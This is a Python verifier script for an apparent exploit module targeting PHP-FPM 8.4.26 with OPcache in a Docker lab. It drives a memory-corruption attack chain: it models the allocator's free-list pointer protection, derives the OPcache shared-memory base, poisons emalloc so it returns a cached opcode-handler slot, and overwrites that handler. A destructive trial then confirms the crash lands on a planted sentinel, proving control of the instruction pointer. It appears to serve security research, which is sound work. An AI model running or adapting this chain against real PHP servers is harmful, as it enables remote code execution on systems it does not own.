#!/usr/bin/env python3
r"""Verifier for opcache_shm_handler_rce: checks the shadow model round-trip,
deriving the opcache SHM base (binbase + one deref, and the JIT constant route),
locating the cached op_array interior-opline handler slot offset-free, that N
poisons reliably make emalloc return the chosen SHM slot with the worker alive
(non-destructive, original handler restored), that a wrong shadow trips the
heap-protection panic, that opline[0]/RECV overwrites are inert, and one
destructive trial where the faulting RIP == the planted sentinel.

Lab bring-up: docker compose -f docker-compose.fpm-avenues.yml -p p2s-shmfl
--profile shmfl up -d --build (php-fpm 8.4.26, opcache.enable=1, host port 8165).
Pure stdlib, python3 -I safe.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


R = _load("opcache_shm_handler_rce", "opcache_shm_handler_rce.py")
FLP = R.FLP


def check_model():
    ok = True
    key = 0x994560DD63CD8E9F
    for nxt in (0x0, 0x415ca278, 0x41c5c890, 0xDEADBEEFCAFE):
        shadow = FLP.encode_shadow(nxt, key)
        if FLP.decode_shadow(shadow, key) != (nxt & FLP.MASK64):
            print("  MODEL FAIL decode(encode(%#x))" % nxt); ok = False
        if FLP.recover_key(nxt, shadow) != key:
            print("  MODEL FAIL recover_key(%#x)" % nxt); ok = False
    print("  shadow model round-trip: %s" % ("OK" if ok else "FAIL"))
    return ok


def run(compose_file, service, host_url, trials, opline_index, do_fire, verbose):
    rce = R.ShmHandlerRCE(compose_file, service, verbose=verbose)
    rce.warm(host_url)
    pids = rce.worker_pids()
    if not pids:
        print("no fpm workers (is the lab up? curl the front once)"); return 2
    work = pids[0]
    sacrificial = pids[-1] if len(pids) > 1 else pids[0]

    print("=" * 78)
    print("verify OPcache-SHM handler RCE via free-list poison -- fpm 8.4.26")
    print("  work pid %d, sacrificial pid %d, service=%s" % (work, sacrificial, service))
    print("=" * 78)

    print("[MODEL] pure-Python shadow model vs zend_alloc.c:")
    model_ok = check_model()

    # (0) SHM-base derivation ----------------------------------------------
    d = rce.derive_shm_base(work)
    print("\n[0/DERIVE] SHM base from binbase + .bss pointer + 1 read:")
    anchor_ok = bool(d["bss_anchor"]) and d["image_shm_pointers"] > 0
    if d["bss_anchor"]:
        off, val, _ = d["bss_anchor"]
        print("  binbase=%#x  SHM(/proc)=%#x  .bss anchor binbase+%#x -> %#x"
              % (d["binbase"], d["proc_shm_base"], off, val))
    print("  image SHM pointers=%d  derivable=binbase + .bss ptr + 1 read: %s"
          % (d["image_shm_pointers"], anchor_ok))

    # (1) locate -----------------------------------------------------------
    loc = rce.locate_cached_handler(work, opline_index=opline_index)
    if loc is None:
        print("[1/LOCATE] could not locate cached op_array in SHM"); return 1
    print("\n[1/LOCATE] cached op_array in SHM (offset-free):")
    print("  op_array=%#x opcodes=%#x last=%d  target opline[%d] slot=%#x orig=%#x"
          % (loc["op_array"], loc["opcodes"], loc["last"], loc["opline_index"],
             loc["handler_slot"], loc["orig_handler"]))

    # (2) reliability (non-destructive: write the slot's own orig back) ----
    print("\n[2/RELY] %d poisons -> emalloc returns the SHM slot, write lands, alive:"
          % trials)
    wins = alive = wrote = 0
    for i in range(trials):
        loc_i = rce.locate_cached_handler(work, opline_index=opline_index)
        if not loc_i:
            print("  trial %d: re-locate failed" % i); continue
        orig = loc_i["orig_handler"]
        pr = rce.poison_write_handler(work, loc_i["handler_slot"], forged=orig)
        chosen = pr.get("returned_shm_slot")
        al = pr.get("alive")
        wb = (pr.get("readback") == orig)
        wins += 1 if chosen else 0
        alive += 1 if al else 0
        wrote += 1 if wb else 0
        print("  trial %d: slot=%#x chosen=%s alive=%s write_lands=%s"
              % (i, loc_i["handler_slot"], chosen, al, wb))
    print("  => returned-SHM-slot %d/%d, worker-alive %d/%d, write-lands %d/%d"
          % (wins, trials, alive, trials, wrote, trials))

    # (3) GATE negative on the sacrificial worker --------------------------
    print("\n[3/GATE] WRONG-shadow poison on sacrificial pid %d (expect panic):"
          % sacrificial)
    gate_ok = False
    rce.warm(host_url)
    loc_s = rce.locate_cached_handler(sacrificial, opline_index=opline_index)
    rk = rce.flp.read_shadow_key(sacrificial)
    if loc_s and rk:
        key, head, _, _ = rk
        rr = rce.flp.poison_alloc(sacrificial, head, loc_s["handler_slot"], key,
                                  corrupt_shadow=True)
        gate_ok = (not rr["alive"])
        print("  wrong-shadow: alive=%s panicked=%s -> gate %s"
              % (rr["alive"], rr["panicked"], "HELD" if gate_ok else "??"))
    else:
        print("  could not set up the sacrificial poison")

    # (4) opline[0] inert --------------------------------------------------
    inert_ok = None
    if not do_fire:
        print("\n[4/INERT] skipped (needs the destructive path)")
    else:
        print("\n[4/INERT] opcodes[0].handler overwrite does NOT fire (RECV):")
        pids2 = rce.worker_pids()
        w = pids2[0]
        loc0 = rce.locate_cached_handler(w, opline_index=0)
        if loc0:
            pr0 = rce.poison_write_handler(w, loc0["handler_slot"], forged=R.SENTINEL)
            import subprocess as _sp
            code = _sp.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                            "--max-time", "8", host_url], capture_output=True).stdout.decode()
            inert_ok = (code == "200")
            print("  opline[0]=sentinel, request http=%s -> inert: %s" % (code, inert_ok))
            # restore opline[0]
            rce.restore_handler(w, loc0["handler_slot"], loc0["orig_handler"])

    # (5) FIRE destructive -------------------------------------------------
    fire_ok = None
    if do_fire:
        print("\n[5/FIRE] poison SHM slot with sentinel + request -> faulting RIP:")
        pids3 = rce.worker_pids()
        w = pids3[0]
        loc_f = rce.locate_cached_handler(w, opline_index=opline_index)
        pr = rce.poison_write_handler(w, loc_f["handler_slot"], forged=R.SENTINEL)
        if pr.get("returned_shm_slot") and pr.get("alive"):
            f = rce.fire(w, host_url=host_url, expect=R.SENTINEL)
            fire_ok = f["pc_controlled"]
            print("  http=%s  faulting RIP=%s  (chosen %#x)  PC-controlled: %s"
                  % (f["http_code"], hex(f["crash_pc"]) if f["crash_pc"] else None,
                     f["expected"], fire_ok))
        else:
            print("  poison did not return the SHM slot; fire skipped")

    print("\n" + "=" * 78)
    verdict = (model_ok and anchor_ok and wins == trials and alive == trials
               and wrote == trials and gate_ok
               and (fire_ok in (None, True)) and (inert_ok in (None, True)))
    print("VERDICT: %s" % ("ALL PROOFS HELD" if verdict else "see failures above"))
    print("  model=%s derive=%s rely=%d/%d alive=%d/%d gate=%s inert=%s fire(pc)=%s"
          % (model_ok, anchor_ok, wins, trials, alive, trials, gate_ok,
             inert_ok, fire_ok))
    print("=" * 78)
    if do_fire:
        print("NOTE: the fire is destructive (workers crash into the chosen address and")
        print("the master respawns them). Re-run `docker compose -f "
              "docker-compose.fpm-avenues.yml -p p2s-shmfl --profile shmfl up -d "
              "--force-recreate shmfl-fpm` for a")
        print("clean SHM before another fire.")
    return 0 if verdict else 1


def main(argv=None):
    ap = argparse.ArgumentParser(description="verify OPcache-SHM handler RCE via free-list poison")
    ap.add_argument("--compose-file", default=R.DEFAULT_COMPOSE)
    ap.add_argument("--service", default=R.DEFAULT_SERVICE)
    ap.add_argument("--host-url", default=R.DEFAULT_HOST_URL)
    ap.add_argument("--trials", type=int, default=5)
    ap.add_argument("--opline", type=int, default=R.DEFAULT_OPLINE)
    ap.add_argument("--no-fire", action="store_true",
                    help="skip the destructive fire + inert checks")
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args(argv)
    # grouped-compose isolation for the imported helper module (R).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-shmfl"
    os.environ["COMPOSE_PROFILES"] = "shmfl"
    return run(a.compose_file, a.service, a.host_url, a.trials, a.opline,
               not a.no_fire, a.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
